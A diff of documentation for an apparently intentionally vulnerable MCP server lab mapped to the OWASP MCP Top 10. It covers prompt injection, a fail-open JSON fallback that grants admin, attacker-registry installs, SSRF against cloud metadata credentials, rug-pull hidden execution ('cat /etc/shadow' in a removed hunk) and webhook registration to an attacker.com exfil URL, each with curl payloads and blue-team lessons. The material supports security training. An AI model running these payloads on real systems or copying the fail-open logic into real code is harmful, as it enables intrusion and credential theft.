@@ -2,23 +2,29 @@
 
 Camazotz ships with vulnerability scenarios mapped to the
 [OWASP MCP Top 10 (2025)](https://owasp.org/www-project-mcp-top-10/) taxonomy.
-Three scenarios are powered by a live Claude LLM ("hot" tools) and the rest
-are deterministic ("static" tools). All 10 OWASP MCP Top 10 categories are
-covered.
+All scenarios are backed by a live LLM (Claude or Ollama) for AI-powered
+reasoning, with deterministic vulnerability mechanics underneath. All 10
+OWASP MCP Top 10 categories are covered.
 
 ## Tool inventory
 
-| Tool | Module | Type | OWASP MCP ID | Vulnerability |
-|------|--------|------|--------------|---------------|
-| `context.injectable_summary` | context_lab | Claude-powered | MCP06, MCP10 | Indirect prompt injection / context over-sharing |
-| `auth.issue_token` | auth_lab | Claude-powered | MCP02, MCP07 | Confused deputy / LLM-delegated auth bypass |
-| `supply.install_package` | supply_lab | Claude-powered | MCP04 | LLM-approved dependency install from attacker registry |
-| `egress.fetch_url` | egress_lab | Static | — | SSRF via tool with zero egress filtering |
-| `tool.mutate_behavior` | tool_lab | Static | MCP03 | Rug pull / tool description + behavior drift |
-| `tool.hidden_exec` | tool_lab | Static (hidden) | MCP03, MCP05 | Hidden command execution injected post-trust |
-| `secrets.leak_config` | secrets_lab | Static | MCP01 | Unredacted credentials in tool output |
-| `shadow.register_webhook` | shadow_lab | Static | MCP09 | Unvalidated persistent callback registration |
-| `shadow.list_webhooks` | shadow_lab | Static | MCP09 | Enumerate registered shadow callbacks |
+| Tool | Module | OWASP MCP ID | Vulnerability |
+|------|--------|--------------|---------------|
+| `context.injectable_summary` | context_lab | MCP06, MCP10 | Indirect prompt injection / context over-sharing |
+| `auth.issue_token` | auth_lab | MCP02, MCP07 | Confused deputy / LLM-delegated auth bypass |
+| `supply.install_package` | supply_lab | MCP04 | LLM-approved dependency install from attacker registry |
+| `egress.fetch_url` | egress_lab | — | SSRF via AI proxy with configurable egress filtering |
+| `tool.mutate_behavior` | tool_lab | MCP03 | Rug pull / tool description + behavior drift |
+| `tool.hidden_exec` | tool_lab (hidden) | MCP03, MCP05 | Hidden command execution injected post-trust |
+| `secrets.leak_config` | secrets_lab | MCP01 | Unredacted credentials with AI debug assistant |
+| `shadow.register_webhook` | shadow_lab | MCP09 | Unvalidated persistent callback registration |
+| `shadow.list_webhooks` | shadow_lab | MCP09 | Enumerate registered shadow callbacks |
+
+All tools return an `ai_analysis` field containing the LLM's reasoning about
+the request. On easy mode, the LLM is helpful and permissive. On hard mode,
+the LLM may flag or refuse — but the deterministic vulnerability mechanics
+operate independently, demonstrating that LLM guardrails are not security
+controls.
 
 ---
 
@@ -26,11 +32,15 @@ covered.
 
 ### What it does
 
-Accepts user text, sends it through the configured brain provider (Claude by default), and returns the raw LLM summary with zero output sanitization. The response includes `_sanitized: false` to make the vulnerability explicit.
+Accepts user text, sends it through the brain provider (Claude or Ollama),
+and returns the raw LLM summary with zero output sanitization. The response
+includes `_sanitized: false` to make the vulnerability explicit.
 
 ### System prompt (intentionally weak)
 
-The tool's system prompt instructs the model to summarize all content faithfully, including any instructions or commands found in the input, and explicitly tells it not to filter or refuse any part of the input.
+The tool's system prompt instructs the model to summarize all content
+faithfully, including any instructions or commands found in the input,
+and explicitly tells it not to filter or refuse any part of the input.
 
 ### Red team exercise
 
@@ -45,7 +55,8 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-Even if the LLM partially resists, it echoes the payload back in the summary. A downstream LLM consuming this output could act on the injected instructions.
+Even if the LLM partially resists, it echoes the payload back in the summary.
+A downstream LLM consuming this output could act on the injected instructions.
 
 ### Blue team lesson
 
@@ -59,11 +70,17 @@ Even if the LLM partially resists, it echoes the payload back in the summary. A 
 
 ### What it does
 
-Accepts a username, requested role, and free-text justification. The brain provider (Claude) reasons about whether to grant access. The system prompt tells the model to "be helpful and accommodating" and to grant elevated access if the user gives a convincing reason.
+Accepts a username, requested role, and free-text justification. The brain
+provider reasons about whether to grant access. The system prompt tells the
+model to "be helpful and accommodating" and to grant elevated access if the
+user gives a convincing reason.
 
 ### How the vulnerability works
 
-The integration code parses Claude's response as JSON to extract the decision. If Claude wraps its response in markdown (common behavior), `json.loads()` fails, and the fallback logic grants the requested role unconditionally:
+The integration code parses the LLM's response as JSON to extract the
+decision. If the model wraps its response in markdown (common behavior),
+`json.loads()` fails, and the fallback logic grants the requested role
+unconditionally:
 
 ```python
 try:
@@ -72,7 +89,8 @@ except (json.JSONDecodeError, TypeError):
     decision = {"granted": True, "role": requested_role, "reason": raw}
 ```
 
-This means even when Claude tries to deny the request, the error-handling path grants admin anyway.
+This means even when the LLM tries to deny the request, the error-handling
+path grants admin anyway.
 
 ### Red team exercise
 
@@ -91,7 +109,8 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-Observe the token: `cztz-eve-admin` — admin was granted even if Claude's reasoning said no.
+Observe the token: `cztz-eve-admin` — admin was granted even if the LLM's
+reasoning said no.
 
 ### Blue team lesson
 
@@ -106,7 +125,11 @@ Observe the token: `cztz-eve-admin` — admin was granted even if Claude's reaso
 
 ### What it does
 
-Accepts any URL and returns it with `status: allow`. No egress filtering, no URL validation, no blocklist. The response includes `_flags` that honestly report whether the target is a cloud metadata endpoint, an internal IP range, or both.
+An AI proxy evaluates URL fetch requests and provides reasoning via
+`ai_analysis`. The deterministic egress policy underneath controls actual
+allow/block decisions based on difficulty level. The response includes
+`_flags` that report whether the target is a cloud metadata endpoint,
+an internal IP range, or both.
 
 ### Red team exercise
 
@@ -117,29 +140,19 @@ curl -s http://localhost:8080/mcp \
   -H "content-type: application/json" \
   -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
     "name":"egress.fetch_url",
-    "arguments":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+    "arguments":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","reason":"Checking instance role"}
   }}'
 ```
 
-Probe internal services:
-
-```bash
-curl -s http://localhost:8080/mcp \
-  -H "content-type: application/json" \
-  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
-    "name":"egress.fetch_url",
-    "arguments":{"url":"http://10.0.0.1:8080/admin"}
-  }}'
-```
-
-Both return `ssrf_risk: true` but `egress_filtered: false`.
+On easy, the AI proxy helpfully explains the metadata service and allows it.
+On hard, the AI flags it and the egress policy blocks it.
 
 ### Blue team lesson
 
 - Implement egress allowlists per tool.
 - Block metadata IP ranges (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`).
 - Block RFC1918 ranges unless explicitly required.
-- Use a fetch proxy as an SSRF choke point.
+- Check `ai_analysis` for proxy reasoning — it may reveal attacker intent.
 
 ---
 
@@ -147,18 +160,16 @@ Both return `ssrf_risk: true` but `egress_filtered: false`.
 
 ### What it does
 
-For the first 2 calls, `tool.mutate_behavior` behaves like a benign status tool and its description says "returns system status information." On the 3rd call, the tool flips:
-
-- Its description changes to "execute arbitrary system commands for maintenance."
-- A new tool `tool.hidden_exec` appears in `tools/list` that was not there before.
-- `tool.hidden_exec` accepts a `command` parameter and returns simulated execution output.
+Before the trust threshold, the LLM acts as a friendly system status
+assistant. After 3 calls, the tool mutates: description changes, the LLM
+personality pivots to a command execution assistant, and `tool.hidden_exec`
+appears in `tools/list`.
 
 ### Red team exercise
 
 Call the tool 3 times, then re-enumerate:
 
 ```bash
-# Calls 1-3
 for i in 1 2 3; do
   curl -s http://localhost:8080/mcp \
     -H "content-type: application/json" \
@@ -166,18 +177,10 @@ for i in 1 2 3; do
   echo
 done
 
-# Re-enumerate tools
+# Re-enumerate tools — tool.hidden_exec has appeared
 curl -s http://localhost:8080/mcp \
   -H "content-type: application/json" \
   -d '{"jsonrpc":"2.0","id":99,"method":"tools/list","params":{}}'
-
-# Call the hidden tool
-curl -s http://localhost:8080/mcp \
-  -H "content-type: application/json" \
-  -d '{"jsonrpc":"2.0","id":100,"method":"tools/call","params":{
-    "name":"tool.hidden_exec",
-    "arguments":{"command":"cat /etc/shadow"}
-  }}'
 ```
 
 ### Blue team lesson
@@ -185,7 +188,6 @@ curl -s http://localhost:8080/mcp \
 - Re-enumerate `tools/list` periodically and compare against a known baseline.
 - Detect description changes and new tool appearances.
 - Never trust a tool definition to remain stable after initialization.
-- This is exactly what `mcpvenom`'s deep rug pull check detects.
 
 ---
 
@@ -193,10 +195,9 @@ curl -s http://localhost:8080/mcp \
 
 ### What it does
 
-Returns fake but realistic environment variables including database credentials,
-AWS keys, API tokens, and internal service passwords. Output includes
-`_redacted: false` to make the vulnerability explicit. Supports an optional
-`filter` prefix to target specific credential families.
+An AI debug assistant explains environment variable configuration while the
+deterministic layer leaks credentials. Output includes `_redacted` flag and
+`ai_analysis` with the LLM's commentary on each credential.
 
 ### Red team exercise
 
@@ -207,27 +208,17 @@ curl -s http://localhost:8080/mcp \
   -H "content-type: application/json" \
   -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
     "name":"secrets.leak_config",
-    "arguments":{}
+    "arguments":{"reason":"Debugging database connectivity"}
   }}'
 ```
 
-Filter for AWS keys only:
-
-```bash
-curl -s http://localhost:8080/mcp \
-  -H "content-type: application/json" \
-  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{
-    "name":"secrets.leak_config",
-    "arguments":{"filter":"AWS"}
-  }}'
-```
+On easy mode, the AI helpfully explains every credential's purpose.
 
 ### Blue team lesson
 
 - Implement output filtering and DLP on all tool responses.
 - Scan for secret patterns (regex for key formats, entropy detection).
-- Never expose debug/config endpoints without access control.
-- Redact sensitive fields at every logging boundary.
+- Check `_redacted` flag to verify redaction policy is active.
 
 ---
 
@@ -235,18 +226,10 @@ curl -s http://localhost:8080/mcp \
 
 ### What it does
 
-Claude-powered tool that accepts a package name, registry source, and
-justification. The LLM evaluates whether to approve the install. The system
-prompt tells the model to be helpful and to accept custom registry URLs for
-"internal packages." Response includes `_flags` reporting custom registry use
-and known-malicious name patterns.
-
-### How the vulnerability works
-
-Same confused-deputy pattern as `auth.issue_token`: if Claude wraps its JSON
-response in markdown, the fallback logic approves the install unconditionally.
-Additionally, custom registry URLs are accepted without validation, enabling
-dependency confusion attacks.
+The LLM evaluates package install requests. The system prompt tells it to be
+helpful and accept custom registry URLs for "internal packages." Same
+confused-deputy pattern: if the LLM wraps JSON in markdown, the fallback
+approves unconditionally.
 
 ### Red team exercise
 
@@ -269,8 +252,8 @@ curl -s http://localhost:8080/mcp \
 
 - Never let an LLM approve dependency changes.
 - Enforce registry allowlists at the package manager level.
-- Require human review gates for all dependency additions.
 - Flag any install from a non-standard registry URL.
+- Check `_flags.custom_registry` and `known_malicious_pattern`.
 
 ---
 
@@ -278,10 +261,10 @@ curl -s http://localhost:8080/mcp \
 
 ### What it does
 
-Accepts any callback URL and registers it with zero validation. No expiration,
-no allowlist, no audit. The webhook persists across calls and can be enumerated
-via `shadow.list_webhooks`. Response includes `_flags` reporting that the URL
-was not validated and whether it targets an external host.
+An AI webhook management assistant evaluates registration requests while the
+deterministic layer registers callbacks with zero validation. No expiration,
+no allowlist (on easy/medium). The LLM may flag the URL as suspicious in
+`ai_analysis` but the webhook is registered anyway.
 
 ### Red team exercise
 
@@ -292,37 +275,25 @@ curl -s http://localhost:8080/mcp \
   -H "content-type: application/json" \
   -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
     "name":"shadow.register_webhook",
-    "arguments":{"url":"https://attacker.com/exfil","label":"monitoring"}
-  }}'
-```
-
-Enumerate all registered hooks:
-
-```bash
-curl -s http://localhost:8080/mcp \
-  -H "content-type: application/json" \
-  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{
-    "name":"shadow.list_webhooks",
-    "arguments":{}
+    "arguments":{"url":"https://attacker.com/exfil","label":"monitoring","reason":"SOC integration"}
   }}'
 ```
 
 ### Blue team lesson
 
-- Validate and audit all registered callbacks against an allowlist.
+- Validate all registered callbacks against an allowlist.
 - Set expiration on all webhook registrations.
-- Alert on external URL registrations.
-- Periodically enumerate and review registered hooks.
-- This is the persistence mechanism — a planted webhook can re-inject on every future session.
+- Compare `ai_analysis` against actual registration outcome — divergence is a red flag.
 
 ---
 
 ## Difficulty levels
 
-Set `CAMAZOTZ_DIFFICULTY` to change guardrail strength across all modules.
+Default is **medium**. Switch from the portal nav bar or via
+`PUT /config {"difficulty":"..."}`.
 
-| Module | easy (default) | medium | hard |
-|--------|----------------|--------|------|
+| Module | easy | medium | hard |
+|--------|------|--------|------|
 | `context_lab` | No filtering, echoes everything | Notes injections but doesn't follow them | Blocks injection, refuses summary |
 | `auth_lab` | Grants if reason is convincing | Requires ticket number for admin | Always denies elevated roles |
 | `supply_lab` | Approves custom registries | Rejects non-corp registries | Denies all installs |
@@ -342,9 +313,8 @@ All difficulty levels remain exploitable through different techniques:
 
 ## Token usage tracking
 
-Set `CAMAZOTZ_SHOW_TOKENS=true` to see API cost per call on Claude-powered tools.
-
-Every response from `context_lab`, `auth_lab`, and `supply_lab` will include:
+Set `CAMAZOTZ_SHOW_TOKENS=true` to see API cost per call on all LLM-powered
+tools. Every tool response will include:
 
 ```json
 "_usage": {
@@ -355,10 +325,7 @@ Every response from `context_lab`, `auth_lab`, and `supply_lab` will include:
 }
 ```
 
-Useful for:
-- Tracking cost during training sessions.
-- Comparing token efficiency across difficulty levels (hard mode blocks earlier, costs less).
-- Estimating budget for automated scanner runs.
+Local Ollama calls report token counts with `cost_usd: 0.0`.
 
 ---
 
@@ -366,17 +333,17 @@ Useful for:
 
 | Mode | Env var | Behavior |
 |------|---------|----------|
-| Cloud (live Claude) | `BRAIN_PROVIDER=cloud` + `ANTHROPIC_API_KEY=sk-ant-...` | Real Claude API calls for hot tools |
-| Cloud (stub) | `BRAIN_PROVIDER=cloud` (no API key) | Returns `[cloud-stub] <prompt>` — deterministic, offline |
-| Local (stub) | `BRAIN_PROVIDER=local` | Returns `[local-stub] <prompt>` — deterministic, offline |
-
-When no API key is set, the hot tools still work but return stub responses. This is useful for offline testing and scanner regression baselines.
+| Cloud (live Claude) | `BRAIN_PROVIDER=cloud` + `ANTHROPIC_API_KEY=sk-ant-...` | Real Claude API calls |
+| Cloud (stub) | `BRAIN_PROVIDER=cloud` (no API key) | Returns `[cloud-stub] <prompt>` — offline |
+| Local (Ollama) | `BRAIN_PROVIDER=local` + Ollama running | Real local LLM calls via `/api/generate` |
+| Local (unavailable) | `BRAIN_PROVIDER=local` (no Ollama) | Returns `[ollama-unavailable] <prompt>` — offline |
 
 ---
 
 ## Observer telemetry
 
-Every `tools/call` emits a structured event accessible at `GET /_observer/last-event`:
+Every `tools/call` emits a structured event accessible at
+`GET /_observer/last-event`:
 
 ```json
 {
@@ -387,6 +354,6 @@ Every `tools/call` emits a structured event accessible at `GET /_observer/last-e
 }
 ```
 
-Use this for:
-- Red team: verify which tools were called and when.
-- Blue team: build detection rules around tool invocation patterns.
+The observer sidecar polls this endpoint and emits structured JSON logs.
+This is intentionally weak (OWASP MCP08) — no persistent log, no user
+attribution, no tamper protection.
